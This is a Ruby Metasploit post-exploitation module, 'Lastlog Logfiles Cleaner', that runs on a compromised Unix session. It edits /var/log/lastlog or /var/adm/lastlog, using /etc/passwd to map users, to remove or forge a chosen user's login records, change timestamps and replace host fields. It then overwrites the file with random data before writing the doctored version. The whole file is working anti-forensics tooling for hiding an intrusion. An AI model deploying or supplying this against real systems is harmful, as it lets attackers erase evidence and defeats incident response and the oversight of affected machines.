#$LOAD_PATH.push "../staekka/external/bindata/lib"
#$LOAD_PATH.push File.expand_path(File.join(Msf::Config.staekka_path, 'external', 'bindata', 'lib' ))

require 'bindata'
require 'time'
require 'ipaddr'
require 'tempfile'


require 'msf/core'
require 'msf/core/post/file'
require 'core/post/staekka'
require 'core/post/staekka/file'
require 'core/post/staekka/unix'
require 'core/post/unix/lastlog'
require 'core/post/unix/commands'


class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  #include Msf::Post::Staekka::File
  include Msf::Post::Staekka::Unix
  include Msf::Post::Unix::Commands
  include Msf::Post::Updatedb

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Lastlog Logfiles Cleaner',
        'Description'   => %q(Clear lastlog  logfiles),
        'Author'        => [ 'jot'],
        'SessionTypes'  => [ 'shell' ]
      ))
    register_options(
      [
        OptBool.new('USE_UPDATEDB',  [ false, 'Use an updatedb database and search for filenames instead of full path', true]),
        OptString.new('STRING',  [ false, 'A string to be removed from the log files']),
        OptString.new('REPLACE',  [ false, 'A string for replacing the original string (if empty logentries will be removed)']),
        OptString.new('FILES',  [ false, 'A special log file']),
        OptString.new('NEW_TIME',  [ false, 'Set new time stamp ']),
        OptString.new('USER',  [ false, 'User to be deleted/changed']),
      ], self.class)
  end

  def run
    time_min = nil
    time_max = nil
    if datastore['STRING']
      string = datastore['STRING'].to_s.strip
      if string.empty?
        string = nil
      end
    else
      string = nil
    end
    if datastore['REPLACE']
      replace = datastore['REPLACE'].to_s.strip
      if replace.empty?
        replace = nil
      end
    else
      replace = nil
    end
    if datastore['USER']
      user = datastore['USER'].to_s.strip
      if user.empty?
        user = nil
      end
    else
      user = nil
    end

    if datastore['NEW_TIME']
      begin
        new_time = Time.parse(datastore['NEW_TIME'])
      rescue
        print_error "Wrong time format. Information about format: Time.parse (http://ruby-doc.org/stdlib-2.2.3/libdoc/time/rdoc/Time.html#method-c-parse)"
        raise ArgumentError
      end
    end

    all_log_files.each do |file|
      attr = nil
      ################
      # check file permissions
      next unless  permissions?(file)
      ################
      # size check/warning
      size = filesize(file)
      if size.nil? || size == 0
        vprint_warning "#{file}: not readable or empty"
        next
      elsif size > 1024 * 1024 * 1024 # 1G
        print_error "#{file}: file size (#{size}) more than 1 G: This would fail and crash the session! Cannot download"
        print_error "#{file} will be igroned due to this size"
        next
      elsif size > 1024 * 1024 * 100  # 100 MB
        print_warning "#{file}: file size (#{size}) more than 100Mb: This will need long time and lot of recourses"
        print_error "#{file} will be igroned due to this size"
        next
      elsif size > 1024 * 1024 * 10           # 10 MB
        # 10 MB
        print_warning "#{file}: file size (#{size}) more than 10Mb: This will need a while"
      elsif size > 1024 * 1024                                # 1MB
        print_warning "#{file}: file size (#{size}) more than 1Mb: This might need some time"
      else                                                                                                            # less
        # OK
      end

      ################
      # timestamp
      #tmpfile = touch_tmpfile(file)
      ###############
      #
      clean = clear_lastlog(file, user, string, replace, new_time)
      if clean.nil?
        print_error "Empty output: something might be wrong. check manualy!"
        next
      end
      ##################
      # overwrite file
      random_data = ::Rex::Text.rand_text_alpha(size)
      random_data <<  "\x00" * 256
      write_file(file, random_data)
      ##################
      # write file
      write_file(file, clean)
      #
    end
  end

  def all_log_files
    out = []
    if datastore['FILES']
      files = datastore['FILES'].split(" ")
    else
      files = log_files_lastlog
    end

    files.flatten!
    files.compact!
    files.uniq!

    files.each do |file|
      #puts "File? #{file}"
      file.strip!
      next if file.empty?
      if (file.start_with? '/') or  (file.start_with? './') or (file.start_with? '..')
        if exists?(file)
          out << file
        end
      else
        # search updatedb
        out.concat find_files(file)
      end
    end
    out
  end

  def log_files_lastlog
    [ "/var/log/lastlog",          # Linux
      "/var/adm/lastlog",      # Solaris
    ]
  end

  def permissions?(file)
    if (readable?(file)) and (writeable?(file))
      true
    else
      print_error "read permissions: #{readable?(file)}"
      print_error "write permissions: #{writeable?(file)}"
      print_error "Need read and write permissions for #{file} for changing it! Cannot go on"
      print_error "This could also be a known bug of this check. In this case you simply need to re-run this module"
      false
    end
  end

  def is_uid?(uid, username)
    begin
      user = Integer(username)
      uid == user
    rescue
      false
    end
  end
  #
  def clear_lastlog(logfile, user=nil, search=nil, replace=nil, new_time=nil)
    clear_data = ''
    unless search.nil? or search.empty?
      rx = Regexp.new(search)
    end
    logfile = StringIO.new(read_file(logfile, true, false))
    lastlog = LastLog.new
    lastlog.read_passwd(read_file("/etc/passwd", true, false))
    lastlog.each_entry(logfile) do | lastlog, uid |
      needs_modify = false
      modifyed = false
      data =  lastlog.dump_entry(uid)
      username = lastlog.uidmap[uid]
      if user
        username = lastlog.uidmap[uid]

        if (username == user) or is_uid?(uid, user)
          needs_modify = true
        end
      end
      if rx
        if rx.match(data["ll_line"]) or rx.match(data["ll_host"])
          print_status "Regex /#{rx}/ matches"
          needs_modify = true
        end
      end

      if needs_modify == true
        print_status "Need modify\tuid=#{uid} user=#{username} Line=|#{data["ll_line"]}| Host=|#{data["ll_host"]}| Time=#{data["ll_time"]}"
        if new_time
          print_status "#{data["ll_time"]} -> #{new_time.to_s}"
          data["ll_time"] = new_time.to_i
          modifyed = true
        end
        if rx and !replace.to_s.empty?
          if rx.match(data["ll_line"])
            print_status "#{data["ll_line"]} -> #{replace}"
            data["ll_line"] = replace
            modifyed = true
          end
          if rx.match(data["ll_host"])
            print_status "#{data["ll_host"]} -> #{replace}"
            data["ll_host"] = replace
            modifyed = true
          end
        end

        if modifyed == true
          entry = lastlog.create_entry(data, uid)
        else
          entry =  lastlog.create_lastlog
        end
      else
        entry = lastlog.create_entry(data, uid)
      end
      clear_data << entry.to_binary_s

    end
    clear_data
  end

end
